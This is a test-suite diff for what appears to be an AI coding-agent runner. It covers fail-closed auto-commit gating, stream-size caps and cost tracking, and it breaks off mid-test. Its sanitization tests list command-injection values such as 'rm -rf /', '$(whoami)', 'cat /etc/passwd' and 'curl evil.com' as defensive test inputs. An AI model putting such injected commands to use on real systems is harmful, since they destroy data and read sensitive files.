@@ -11,6 +11,10 @@ Covers:
 - _write_bot_status
 
 Ticket: CB-9812194-42DA
+
+Contract tests (keyword 'contract' in test name):
+- _is_implementation_bot role-based matching contract
+- _flush_cost_accumulator economics integration contract
 """
 import json
 import os
@@ -38,8 +42,13 @@ from codebot.api_runner import (
     _is_implementation_bot,
     _create_ticket_tool,
     _log,
+    _persist_stream,
+    _flush_cost_accumulator,
+    _cost_accumulator,
+    _init_cost_accumulator,
     HIGH_RISK_TOKEN_MANIFESTS,
 )
+import codebot.api_runner as _api_runner_module
 from codebot.ticket_engine import TicketStore, TicketClass, TicketState, Severity, RiskLevel
 
 
@@ -361,14 +370,18 @@ class TestAutoCommitGatekeeperFailClosed:
     @pytest.mark.parametrize(
         ("bot_name", "expected"),
         [
-            ("backend_implementer", True),
-            ("test_implementer-2", True),
+            ("implementer", True),
+            ("implementer-1", True),
+            ("implementer-CB-B186E", True),
             ("decomposer", False),
+            ("backend_implementer", False),
+            ("test_implementer-2", False),
             ("implementation_planner-4", False),
             ("security_reviewer", False),
         ],
     )
-    def test_auto_commit_is_limited_to_implementation_roles(self, bot_name, expected):
+    def test_auto_commit_is_limited_to_implementation_roles_contract(self, bot_name, expected):
+        """Contract: only the canonical 'implementer' role prefix counts as an implementation bot."""
         assert _is_implementation_bot(bot_name) is expected
 
     def test_gatekeeper_import_error_blocks_commit(self, tmp_path):
@@ -388,7 +401,7 @@ class TestAutoCommitGatekeeperFailClosed:
                 cmd = call[0][0]
                 assert "git add" not in cmd, f"git add should not execute when gatekeeper import fails: {cmd}"
 
-    def test_gatekeeper_exception_blocks_commit(self, tmp_path):
+    def test_gatekeeper_exception_blocks_commit(self, tmp_path, capsys):
         """When gatekeeper raises an exception, commit must be blocked."""
         adapter = self._make_adapter(tmp_path)
         (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
@@ -399,11 +412,16 @@ class TestAutoCommitGatekeeperFailClosed:
              patch("codebot.api_runner.WORK_ROOT", tmp_path), \
              patch("codebot.gatekeeper.Gatekeeper", mock_gk_cls), \
              patch("codebot.api_runner.bash", return_value={"success": True, "output": "M test.py", "error": ""}) as mock_bash:
-            _auto_commit("test-bot", ["Monitor-Manager-Python/test.py"])
-            # bash should NOT have been called for git add/commit since gatekeeper crashed
+            result = _auto_commit("test-bot", ["Monitor-Manager-Python/test.py"], ticket_id="CB-TEST-123")
+            assert result is False
+            assert mock_gk_cls.return_value.verify_ticket.called
+            assert "blocking commit" in capsys.readouterr().out.lower()
+            # bash should NOT have been called for git add/commit/push since gatekeeper crashed
             for call in mock_bash.call_args_list:
                 cmd = call[0][0]
                 assert "git add" not in cmd, f"git add should not execute when gatekeeper crashes: {cmd}"
+                assert "git commit" not in cmd, f"git commit should not execute when gatekeeper crashes: {cmd}"
+                assert "git push" not in cmd, f"git push should not execute when gatekeeper crashes: {cmd}"
 
     def test_gatekeeper_rework_decision_blocks_commit(self, tmp_path):
         """When gatekeeper returns REWORK decision, commit must be blocked."""
@@ -445,6 +463,138 @@ class TestAutoCommitGatekeeperFailClosed:
             has_git_add = any("add" in (call[0][0] if call[0] else "") for call in mock_bash.call_args_list)
             assert has_git_add, "git add should execute when gatekeeper returns COMPLETE"
             assert mock_gk_cls.return_value.verify_ticket.call_args.kwargs["ticket_id"] == "CB-123"
+
+    def test_auto_commit_sanitizes_malicious_bot_name(self, tmp_path):
+        """Malicious bot_name with shell metacharacters is safely rejected (CB-8696404-69E3).
+
+        Verifies that _auto_commit prevents command injection by blocking
+        bot_names containing shell metacharacters via _BOT_NAME_RE before
+        any git commands are constructed. This is the primary sanitization
+        layer; shlex.quote provides a secondary layer for the commit message.
+        """
+        adapter = self._make_adapter(tmp_path)
+        (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "Monitor-Manager-Python" / "test.py").write_text("x")
+        with patch("codebot.api_runner._adapter_instance", adapter), \
+             patch("codebot.api_runner.WORK_ROOT", tmp_path), \
+             patch("codebot.api_runner.bash", return_value={"success": True, "output": "", "error": ""}) as mock_bash:
+            result = _auto_commit("test; rm -rf /", ["Monitor-Manager-Python/test.py"], ticket_id="CB-123")
+            assert result is False, "Malicious bot_name 'test; rm -rf /' must block commit"
+            assert mock_bash.call_count == 0, "bash must not be called for malicious bot_name"
+
+    def test_auto_commit_handles_normal_bot_name(self, tmp_path):
+        """Normal bot_name passes sanitization and allows commit (CB-8696404-69E3)."""
+        adapter = self._make_adapter(tmp_path)
+        (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "Monitor-Manager-Python" / "test.py").write_text("x")
+        mock_gk_cls = MagicMock()
+        mock_gk_cls.return_value.verify_ticket.return_value = {
+            "decision": "COMPLETE",
+            "failed_gates": [],
+            "passed": True,
+        }
+        with patch("codebot.api_runner._adapter_instance", adapter), \
+             patch("codebot.api_runner.WORK_ROOT", tmp_path), \
+             patch("codebot.gatekeeper.Gatekeeper", mock_gk_cls), \
+             patch("codebot.api_runner.bash", return_value={"success": True, "output": "M test.py", "error": ""}) as mock_bash:
+            result = _auto_commit("implementer-1", ["Monitor-Manager-Python/test.py"], ticket_id="CB-456")
+            assert result is True, "Normal bot_name should allow commit"
+            has_git_add = any("add" in (call[0][0] if call[0] else "") for call in mock_bash.call_args_list)
+            assert has_git_add, "git add should execute for normal bot_name"
+
+
+class TestAutoCommitBotNameSanitization:
+    """Tests for CB-8696404-69E3: bot_name sanitization prevents command injection.
+
+    _auto_commit uses _BOT_NAME_RE (^[a-zA-Z0-9_-]+$) to reject bot names
+    containing shell metacharacters before any git commands are constructed.
+    This is defense-in-depth against OS command injection (CWE-78).
+    """
+
+    def _make_adapter(self, tmp_path):
+        """Create a mock adapter with paths() returning tmp_path-based dirs."""
+        adapter = MagicMock()
+        adapter.paths.return_value = MagicMock(
+            state_dir=tmp_path / "state",
+            quality_policy=tmp_path / "policy.yaml",
+            repository_root=tmp_path,
+        )
+        adapter.paths.return_value.state_dir.mkdir(parents=True, exist_ok=True)
+        return adapter
+
+    @pytest.mark.parametrize("malicious_name", [
+        "bot;rm -rf /",
+        "bot$(whoami)",
+        "bot`id`",
+        "bot|cat /etc/passwd",
+        "bot&&curl evil.com",
+        "bot\nrm -rf /",
+        "bot space",
+        "bot/tab",
+        "../traversal",
+        "bot;echo pwned",
+    ])
+    def test_malicious_bot_name_blocks_commit(self, malicious_name, tmp_path):
+        """Bot names with shell metacharacters must be rejected before any git ops."""
+        adapter = self._make_adapter(tmp_path)
+        (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "Monitor-Manager-Python" / "test.py").write_text("x")
+        with patch("codebot.api_runner._adapter_instance", adapter), \
+             patch("codebot.api_runner.WORK_ROOT", tmp_path), \
+             patch("codebot.api_runner.bash", return_value={"success": True, "output": "", "error": ""}) as mock_bash:
+            result = _auto_commit(malicious_name, ["Monitor-Manager-Python/test.py"], ticket_id="CB-123")
+            assert result is False, f"Malicious bot_name '{malicious_name}' must block commit"
+            # No bash calls should have been made at all — sanitization happens before git
+            assert mock_bash.call_count == 0, (
+                f"bash should not be called for malicious bot_name '{malicious_name}', "
+                f"but was called {mock_bash.call_count} times"
+            )
+
+    def test_normal_bot_name_passes_sanitization(self, tmp_path):
+        """Valid bot names (alphanumeric, hyphens, underscores) pass sanitization."""
+        adapter = self._make_adapter(tmp_path)
+        (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "Monitor-Manager-Python" / "test.py").write_text("x")
+        mock_gk_cls = MagicMock()
+        mock_gk_cls.return_value.verify_ticket.return_value = {
+            "decision": "COMPLETE",
+            "failed_gates": [],
+            "passed": True,
+        }
+        with patch("codebot.api_runner._adapter_instance", adapter), \
+             patch("codebot.api_runner.WORK_ROOT", tmp_path), \
+             patch("codebot.gatekeeper.Gatekeeper", mock_gk_cls), \
+             patch("codebot.api_runner.bash", return_value={"success": True, "output": "M test.py", "error": ""}) as mock_bash:
+            result = _auto_commit("implementer-2", ["Monitor-Manager-Python/test.py"], ticket_id="CB-456")
+            # Sanitization passed; gatekeeper returned COMPLETE; git commands should execute
+            assert result is True, "Valid bot_name should allow commit to proceed"
+            has_git_add = any("add" in (call[0][0] if call[0] else "") for call in mock_bash.call_args_list)
+            assert has_git_add, "git add should execute for valid bot_name after gatekeeper passes"
+
+    def test_non_string_bot_name_blocks_commit(self, tmp_path):
+        """Non-string bot_name (None, int, etc.) must be rejected."""
+        adapter = self._make_adapter(tmp_path)
+        (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "Monitor-Manager-Python" / "test.py").write_text("x")
+        with patch("codebot.api_runner._adapter_instance", adapter), \
+             patch("codebot.api_runner.WORK_ROOT", tmp_path), \
+             patch("codebot.api_runner.bash", return_value={"success": True, "output": "", "error": ""}) as mock_bash:
+            for bad_name in [None, 123, ["list"], {"dict": True}]:
+                result = _auto_commit(bad_name, ["Monitor-Manager-Python/test.py"], ticket_id="CB-789")  # type: ignore[arg-type]
+                assert result is False, f"Non-string bot_name {type(bad_name)} must block commit"
+            assert mock_bash.call_count == 0, "bash should never be called for non-string bot_name"
+
+    def test_empty_bot_name_blocks_commit(self, tmp_path):
+        """Empty string bot_name must be rejected (does not match ^[a-zA-Z0-9_-]+$)."""
+        adapter = self._make_adapter(tmp_path)
+        (tmp_path / "Monitor-Manager-Python").mkdir(parents=True, exist_ok=True)
+        (tmp_path / "Monitor-Manager-Python" / "test.py").write_text("x")
+        with patch("codebot.api_runner._adapter_instance", adapter), \
+             patch("codebot.api_runner.WORK_ROOT", tmp_path), \
+             patch("codebot.api_runner.bash", return_value={"success": True, "output": "", "error": ""}) as mock_bash:
+            result = _auto_commit("", ["Monitor-Manager-Python/test.py"], ticket_id="CB-000")
+            assert result is False, "Empty bot_name must block commit"
+            assert mock_bash.call_count == 0, "bash should not be called for empty bot_name"
 
 
 class TestApiKeyLoggingSecurity:
@@ -728,3 +878,655 @@ class TestCreateTicketTool:
             })
         assert result["success"] is True
         assert "Created ticket" in result["output"]
+
+
+class TestPersistStreamStress:
+    """Stress tests for _persist_stream memory bounding.
+
+    CB-2096CA22C30F1B0B0014D7B1CE28C973: Verify stream persistence remains
+    bounded under adversarial input sizes (100K+ messages) without OOM.
+    """
+
+    def test_persist_stream_handles_100k_messages_without_oom(self, tmp_path):
+        """100K+ messages complete without MemoryError, file <=500KB, truncated."""
+        # Arrange: 100K messages (adversarial history length)
+        num_messages = 100_000
+        # Use small, realistic messages to keep test <30s while still exceeding 500KB
+        # Each message ~50 chars JSON => 100K * 50 = 5MB raw, must truncate to 500KB
+        messages = [
+            {"role": "user", "content": f"msg {i} hello world test content abcdef"}
+            for i in range(num_messages)
+        ]
+        assert len(messages) >= 100_000, "must construct 100K+ message list"
+
+        bot_name = "stress-test-bot"
+        import codebot.api_runner as ar
+
+        # Ensure logs dir exists — _persist_stream does not mkdir when
+        # truncation path is not hit via context tracing alone in some flows
+        (tmp_path / "logs").mkdir(parents=True, exist_ok=True)
+
+        start = time.monotonic()
+        # Act: must complete without MemoryError/OOM
+        with patch.object(ar, "BOTS_DIR", tmp_path):
+            try:
+                ar._persist_stream(
+                    bot_name=bot_name,
+                    messages=messages,
+                    active_model="test-model",
+                    tool_iterations=1,
+                    exit_reason="completed",
+                )
+            except MemoryError:
+                pytest.fail("_persist_stream raised MemoryError on 100K messages - DoS vulnerability")
+            elapsed = time.monotonic() - start
+
+            # Assert: timing bound <30s
+            assert elapsed < 30, f"stress test took {elapsed:.1f}s, must be <30s"
+
+            # Assert: output file exists
+            stream_path = tmp_path / "logs" / f"{bot_name}.stream.json"
+            assert stream_path.exists(), f"stream file must exist at {stream_path}"
+
+            # Assert: file size <=500KB (500_000 bytes)
+            raw = stream_path.read_text(encoding="utf-8")
+            file_size = len(raw.encode("utf-8"))
+            assert file_size <= 500_000, f"stream file {file_size} bytes exceeds 500KB cap"
+
+            # Assert: valid JSON and truncation flag set
+            payload = json.loads(raw)
+            assert payload.get("truncated") is True, "truncation flag must be set for 100K input"
+            assert "messages" in payload
+            # Must have truncated: persisted count < input count
+            assert len(payload["messages"]) < num_messages, "persisted messages must be truncated"
+            assert len(payload["messages"]) > 0, "at least some messages must be persisted"
+
+            # Assert: output is bounded even though input is huge (streaming accumulation)
+            assert len(raw) <= 500_000
+
+    def test_persist_stream_100k_tool_messages_truncation(self, tmp_path):
+        """100K tool messages with large content still bounded to 500KB."""
+        # Arrange: tool messages trigger per-entry content truncation (2000 char cap)
+        num_messages = 100_000
+        large_content = "x" * 3000  # exceeds 2000 char tool truncation
+        messages = [
+            {"role": "tool", "content": large_content, "tool_call_id": f"call_{i}"}
+            for i in range(num_messages)
+        ]
+        bot_name = "stress-tool-bot"
+        import codebot.api_runner as ar
+
+        (tmp_path / "logs").mkdir(parents=True, exist_ok=True)
+
+        start = time.monotonic()
+        with patch.object(ar, "BOTS_DIR", tmp_path):
+            ar._persist_stream(bot_name, messages, "model-x", 2, "iteration_limit")
+            elapsed = time.monotonic() - start
+            assert elapsed < 30, f"took {elapsed:.1f}s"
+
+            stream_path = tmp_path / "logs" / f"{bot_name}.stream.json"
+            assert stream_path.exists()
+            raw = stream_path.read_text(encoding="utf-8")
+            assert len(raw.encode("utf-8")) <= 500_000
+            payload = json.loads(raw)
+            assert payload.get("truncated") is True
+            # Verify tool content truncation was applied to persisted entries
+            for m in payload["messages"]:
+                if m.get("role") == "tool" and isinstance(m.get("content"), str):
+                    assert len(m["content"]) <= 2016, "tool content must be truncated to 2000+len(suffix)"
+
+    def test_persist_stream_small_history_not_truncated(self, tmp_path):
+        """Small history (<500KB) must NOT set truncated flag and persist all."""
+        messages = [{"role": "user", "content": f"hello {i}"} for i in range(10)]
+        bot_name = "small-history-bot"
+        import codebot.api_runner as ar
+
+        (tmp_path / "logs").mkdir(parents=True, exist_ok=True)
+
+        with patch.object(ar, "BOTS_DIR", tmp_path):
+            ar._persist_stream(bot_name, messages, "m", 1, "completed")
+            stream_path = tmp_path / "logs" / f"{bot_name}.stream.json"
+            assert stream_path.exists()
+            payload = json.loads(stream_path.read_text(encoding="utf-8"))
+            # Small payload should not be marked truncated
+            assert payload.get("truncated") is not True
+            assert len(payload["messages"]) == 10
+
+    def test_persist_stream_logs_typed_failures(self, tmp_path, caplog):
+        """Verify that typed exceptions in _persist_stream are logged, not swallowed."""
+        import codebot.api_runner as ar
+        import logging
+
+        bot_name = "fail-test-bot"
+        (tmp_path / "logs").mkdir(parents=True, exist_ok=True)
+
+        # Create a message that is not serializable (e.g., contains a set)
+        bad_message = {"role": "user", "content": {"set": {1, 2, 3}}}
+        messages = [bad_message]
+
+        with patch.object(ar, "BOTS_DIR", tmp_path), \
+             caplog.at_level(logging.WARNING):
+            ar._persist_stream(bot_name, messages, "m", 1, "completed")
+
+        # Check that a warning was logged about skipping the message
+        assert any("skipped non-serializable" in record.message for record in caplog.records), \
+            "Expected warning about skipped non-serializable message"
+
+        # Verify the stream file was still created (fail-open)
+        stream_path = tmp_path / "logs" / f"{bot_name}.stream.json"
+        assert stream_path.exists()
+        payload = json.loads(stream_path.read_text(encoding="utf-8"))
+        # The bad message should have been skipped, so messages list is empty or just has overhead
+        assert len(payload["messages"]) == 0
+
+    def test_persist_stream_tail_trim_loop_triggered_by_overhead_drift(self, tmp_path):
+        """Cover the while-loop tail-trim path (lines ~1540-1555).
+
+        When cumulative per-entry size tracking stays under MAX_SIZE but
+        the final serialized payload exceeds it due to structural overhead,
+        the while loop must pop entries from the tail until under cap.
+        We force this by patching json.dumps to return a larger body on
+        the final full-payload serialization than the sum of per-entry sizes.
+        """
+        import codebot.api_runner as ar
+        original_dumps = json.dumps
+        call_count = {"n": 0}
+
+        def patched_dumps(obj, *args, **kwargs):
+            result = original_dumps(obj, *args, **kwargs)
+            # Only inflate when serializing the full payload dict with messages
+            if isinstance(obj, dict) and "messages" in obj and len(obj.get("messages", [])) > 0:
+                call_count["n"] += 1
+                # On the FIRST full-payload serialization (before while loop),
+                # inflate to exceed MAX_SIZE to trigger the while loop
+                if call_count["n"] == 1:
+                    # Add padding to push over 500KB
+                    padding = "x" * 600_000
+                    return result + padding
+            return result
+
+        bot_name = "tail-trim-bot"
+        # Create enough messages to fill near 500KB
+        messages = [{"role": "user", "content": f"msg-{i}-payload-data"} for i in range(5000)]
+        (tmp_path / "logs").mkdir(parents=True, exist_ok=True)
+
+        with patch.object(ar, "BOTS_DIR", tmp_path), \
+             patch("codebot.api_runner.json.dumps", side_effect=patched_dumps):
+            ar._persist_stream(bot_name, messages, "m", 1, "completed")
+
+        stream_path = tmp_path / "logs" / f"{bot_name}.stream.json"
+        assert stream_path.exists()
+        raw = stream_path.read_text(encoding="utf-8")
+        file_size = len(raw.encode("utf-8"))
+        assert file_size <= 500_000, f"File {file_size} exceeds 500KB after tail-trim"
+        payload = json.loads(raw)
+        assert payload.get("truncated") is True, "truncated flag must be set after tail-trim"
+        assert len(payload["messages"]) < len(messages), "Messages must be trimmed"
+
+    def test_persist_stream_reserialize_when_truncated_flag_added_post_guard(self, tmp_path):
+        """Cover the re-serialization path (lines ~1564-1567).
+
+        When stream_truncated is True from the accumulation break (not the
+        while loop), the truncated flag is added AFTER the initial body
+        serialization. If '"truncated"' is not already in body, it must
+        re-serialize to include the flag.
+        """
+        import codebot.api_runner as ar
+
+        bot_name = "reserialize-bot"
+        # Create messages that will hit the cumulative size break exactly
+        # Each message ~100 bytes JSON, need ~5000 to approach 500KB
+        msg_content = "a" * 90  # ~100 bytes per message with role/key overhead
+        messages = [{"role": "user", "content": msg_content} for _ in range(6000)]
+        (tmp_path / "logs").mkdir(parents=True, exist_ok=True)
+
+        with patch.object(ar, "BOTS_DIR", tmp_path):
+            ar._persist_stream(bot_name, messages, "m", 1, "completed")
+
+        stream_path = tmp_path / "logs" / f"{bot_name}.stream.json"
+        assert stream_path.exists()
+        raw = stream_path.read_text(encoding="utf-8")
+        file_size = len(raw.encode("utf-8"))
+        assert file_size <= 500_000, f"File {file_size} exceeds 500KB"
+        payload = json.loads(raw)
+        # Must have truncated flag set AND present in the serialized body
+        assert payload.get("truncated") is True
+        assert '"truncated"' in raw, "truncated key must appear in serialized JSON"
+        assert len(payload["messages"]) < len(messages)
+
+
+class TestCostTracking:
+    """Tests for economics/cost tracking integration in _flush_cost_accumulator.
+
+    CB-B186EB623EC3E9AFE03D3C344AA2B051: Verify that _flush_cost_accumulator
+    correctly records token usage and phase costs with proper attribution,
+    graceful degradation when economics modules are unavailable, and atomic
+    recording under concurrent access.
+    """
+
+    def _seed_accumulator(self, prompt_tokens=100, completion_tokens=50, call_count=2):
+        """Seed the thread-local cost accumulator with test data."""
+        _init_cost_accumulator()
+        _cost_accumulator.prompt_tokens = prompt_tokens
+        _cost_accumulator.completion_tokens = completion_tokens
+        _cost_accumulator.call_count = call_count
+        _cost_accumulator.start_time = time.time() - 1.0  # 1 second elapsed
+
+    def test_record_usage_called_after_successful_api_call_contract(self):
+        """Contract: token_budget.record_usage invoked via _flush with correct model and token counts."""
+        self._seed_accumulator(prompt_tokens=100, completion_tokens=50, call_count=2)
+
+        with patch.object(_api_runner_module, '_record_token_usage') as mock_record_usage, \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', False):
+            _flush_cost_accumulator("my-bot", "CB-TEST", "gpt-4", "implement")
+
+            mock_record_usage.assert_called_once()
+            call_kwargs = mock_record_usage.call_args.kwargs
+            assert call_kwargs["model"] == "gpt-4"
+            assert call_kwargs["prompt_tokens"] == 100
+            assert call_kwargs["completion_tokens"] == 50
+            # day_utc should be a valid YYYY-MM-DD string
+            import re
+            assert re.match(r"^\d{4}-\d{2}-\d{2}$", call_kwargs["day_utc"])
+
+    def test_record_cost_called_for_tool_execution_contract(self):
+        """Contract: CostTracker.record_phase_cost invoked with correct ticket/agent/model/tokens/phase."""
+        self._seed_accumulator(prompt_tokens=100, completion_tokens=50, call_count=2)
+
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+
+        with patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', False):
+            _flush_cost_accumulator("my-bot", "CB-TEST", "gpt-4", "implement")
+
+            mock_tracker_cls.assert_called_once()
+            mock_tracker_instance.record_phase_cost.assert_called_once()
+            call_kwargs = mock_tracker_instance.record_phase_cost.call_args.kwargs
+            assert call_kwargs["ticket_id"] == "CB-TEST"
+            assert call_kwargs["agent"] == "my-bot"
+            assert call_kwargs["model"] == "gpt-4"
+            assert call_kwargs["prompt_tokens"] == 100
+            assert call_kwargs["completion_tokens"] == 50
+            assert call_kwargs["phase"] == "implement"
+            assert call_kwargs["attempts"] == 2
+            assert "wall_clock_seconds" in call_kwargs
+
+    def test_cost_attribution_uses_current_bot_and_ticket(self):
+        """Bot name and ticket_id flow through to both recording calls."""
+        self._seed_accumulator(prompt_tokens=75, completion_tokens=25, call_count=1)
+
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+
+        with patch.object(_api_runner_module, '_record_token_usage') as mock_record_usage, \
+             patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True):
+            _flush_cost_accumulator(
+                "planner-CB-B186E",
+                "CB-B186EB623EC3E9AFE03D3C344AA2B051",
+                "qwen-3.7-max",
+                "plan"
+            )
+
+            # Verify record_usage was called (attribution is via model, not bot/ticket)
+            mock_record_usage.assert_called_once()
+            assert mock_record_usage.call_args.kwargs["model"] == "qwen-3.7-max"
+
+            # Verify record_phase_cost received exact bot and ticket
+            mock_tracker_instance.record_phase_cost.assert_called_once()
+            cost_kwargs = mock_tracker_instance.record_phase_cost.call_args.kwargs
+            assert cost_kwargs["agent"] == "planner-CB-B186E"
+            assert cost_kwargs["ticket_id"] == "CB-B186EB623EC3E9AFE03D3C344AA2B051"
+            assert cost_kwargs["model"] == "qwen-3.7-max"
+            assert cost_kwargs["phase"] == "plan"
+
+    def test_graceful_degradation_when_economics_unavailable(self):
+        """_HAS_* False / None recorders never crash _flush_cost_accumulator."""
+        self._seed_accumulator(prompt_tokens=100, completion_tokens=50, call_count=2)
+
+        # Simulate missing economics modules
+        with patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', False), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', False), \
+             patch.object(_api_runner_module, '_record_token_usage', None), \
+             patch.object(_api_runner_module, '_CostTracker', None):
+            # Must not raise any exception
+            _flush_cost_accumulator("test-bot", "CB-TEST", "gpt-4", "implement")
+
+        # Verify accumulator was drained even though recorders were unavailable
+        assert _cost_accumulator.prompt_tokens == 0
+        assert _cost_accumulator.completion_tokens == 0
+        assert _cost_accumulator.call_count == 0
+
+    def test_zero_tokens_early_return_without_recorders(self):
+        """Zero-token accumulator early-returns without calling either recorder."""
+        self._seed_accumulator(prompt_tokens=0, completion_tokens=0, call_count=2)
+
+        with patch.object(_api_runner_module, '_record_token_usage') as mock_record_usage, \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True):
+            _flush_cost_accumulator("test-bot", "CB-TEST", "gpt-4", "implement")
+
+            # Neither recorder should be called for zero tokens
+            mock_record_usage.assert_not_called()
+
+    def test_cost_attribution_event_carries_bot_and_ticket(self, caplog):
+        """AC2: per-bot/per-ticket attribution rides alongside record_usage.
+
+        token_budget.record_usage() aggregates by day+model only, so the
+        flush also emits a structured cost_attribution log record carrying
+        bot_name + ticket_id for the economics ledger join.
+        """
+        import logging
+
+        self._seed_accumulator(prompt_tokens=100, completion_tokens=50, call_count=2)
+
+        with patch.object(_api_runner_module, '_record_token_usage') as mock_record_usage, \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', False), \
+             caplog.at_level(logging.INFO, logger="codebot.api_runner"):
+            _flush_cost_accumulator("my-bot", "CB-TEST", "gpt-4", "implement")
+
+            mock_record_usage.assert_called_once()
+            assert any(
+                "cost_attribution" in r.message
+                and "my-bot" in r.message
+                and "CB-TEST" in r.message
+                for r in caplog.records
+            ), "expected cost_attribution log with bot_name and ticket_id"
+
+    def test_state_dir_resolves_from_heartbeat_parent(self, tmp_path):
+        """CostTracker writes land in the runtime state dir, not codebot/.codebot/state."""
+        self._seed_accumulator(prompt_tokens=100, completion_tokens=50, call_count=2)
+
+        hb = tmp_path / "hb-file"
+        ckpt = tmp_path / "ckpt-file"
+        resolved = _api_runner_module._resolve_cost_state_dir(
+            heartbeat_file=str(hb), ckpt_file=str(ckpt)
+        )
+        assert "codebot/.codebot" not in str(resolved).replace("\\", "/")
+
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+        with patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', False):
+            _flush_cost_accumulator(
+                "my-bot", "CB-TEST", "gpt-4", "implement",
+                heartbeat_file=str(hb), ckpt_file=str(ckpt),
+            )
+            mock_tracker_cls.assert_called_once()
+            used_state_dir = Path(mock_tracker_cls.call_args.args[0])
+            assert "codebot/.codebot" not in str(used_state_dir).replace("\\", "/")
+
+    def test_state_dir_parent_named_state_wins(self, tmp_path):
+        """hb_path.parent named 'state' is used verbatim as the ledger dir."""
+        state_dir = tmp_path / "state"
+        state_dir.mkdir()
+        hb = state_dir / "my-bot.heartbeat"
+        resolved = _api_runner_module._resolve_cost_state_dir(heartbeat_file=str(hb))
+        assert resolved == state_dir
+
+    def test_inter_flush_elapsed_documented(self):
+        """wall_clock_seconds reflects the inter-flush slice, not session total."""
+        self._seed_accumulator(prompt_tokens=100, completion_tokens=50, call_count=2)
+        _cost_accumulator.start_time = time.time() - 5.0
+
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+        with patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', False):
+            _flush_cost_accumulator(
+                "my-bot", "CB-TEST", "gpt-4", "implement", state_dir="/tmp/xyz-state"
+            )
+            elapsed = mock_tracker_instance.record_phase_cost.call_args.kwargs[
+                "wall_clock_seconds"
+            ]
+            assert 4.0 <= elapsed <= 30.0
+
+    def test_session_exit_flush_records_accumulated_costs(self, tmp_path):
+        """AC5 integration: _execute_provider_session flushes on session exit.
+
+        A single mocked API response (below the flush-interval threshold)
+        must still reach record_usage + record_phase_cost via the _result()
+        exit flush, with accumulated totals matching the mocked usage.
+        """
+        hb = tmp_path / "sess-bot.heartbeat"
+        ckpt = tmp_path / "CB-SESS.sess-bot.checkpoint.json"
+
+        def api_call(msgs, model, key):
+            return {
+                "choices": [{"message": {"content": "done"}}],
+                "usage": {
+                    "prompt_tokens": 30,
+                    "completion_tokens": 12,
+                    "total_tokens": 42,
+                },
+            }
+
+        mock_tracker_instance = MagicMock()
+        mock_tracker_cls = MagicMock(return_value=mock_tracker_instance)
+        with patch.object(_api_runner_module, '_record_token_usage') as mock_record_usage, \
+             patch.object(_api_runner_module, '_CostTracker', mock_tracker_cls), \
+             patch.object(_api_runner_module, '_HAS_TOKEN_BUDGET', True), \
+             patch.object(_api_runner_module, '_HAS_COST_TRACKER', True):
+            res = _api_runner_module._execute_provider_session(
+                "sess-bot", "gpt-4", [{"role": "user", "content": "hi"}],
+                str(hb), str(ckpt), "key",
+                api_call=api_call,
+                drain_check=lambda n: False,
+                sleep_fn=lambda d: None,
+            )
+            assert res["status"] == "completed"
+            mock_record_usage.assert_called_once()
+            assert mock_record_usage.call_args.kwargs["prompt_tokens"] == 30
+            assert mock_record_usage.call_args.kwargs["completion_tokens"] == 12
+            mock_tracker_instance.record_phase_cost.assert_called_once()
+            cost_kwargs = mock_tracker_instance.record_phase_cost.call_args.kwargs
+            assert cost_kwargs["prompt_tokens"] == 30
+            assert cost_kwargs["completion_tokens"] == 12
+            assert cost_kwargs["agent"] == "sess-bot"
+            assert cost_kwargs["ticket_id"] == "CB-SESS"
+            assert cost_kwargs["model"] == "gpt-4"
+
+    def test_session_flush_interval_records_batched_costs(self, tmp_path):
+        """AC5 integration: periodic flush fires after _COST_FLUSH_INTERVAL calls.
+
+        Drive enough tool-call iterations to cross the flush threshold, then
+        assert both recorders fired at least once with accumulated totals.
+        """
+        hb = tmp_path / "batch-bot.heartbeat"
+        ckpt = tmp_path / "CB-BATCH.batch-bot.checkpoint.json"
+        calls = {"n": 0}
+        interval = _api_runner_module._COST_FLUSH_INTERVAL
+
+        def api_call(msgs, model, key):
+            calls["n"] += 1
+            if calls["n"] <= interval:
+                return {
+                    "choices": [{
+                        "message": {
+                            "tool_calls": [{
+                                "id": str(calls["n"]),
+                                "type": "function",
+                                "function": {"name": "read", "arguments": '{"path":"a"}'},
+                            }],
+                            "content": None,
+                        }
+                    }],
+                    "usage": {
+                        "prompt_tokens": 10,
+                        "completion_tokens": 5,
+                        "total_tokens": 15,
+                    },
+                }
+            return {
+                "choices": [{"message": {"content": "done"}}],
+                "usage": {
+                    "prompt_tokens": 10,
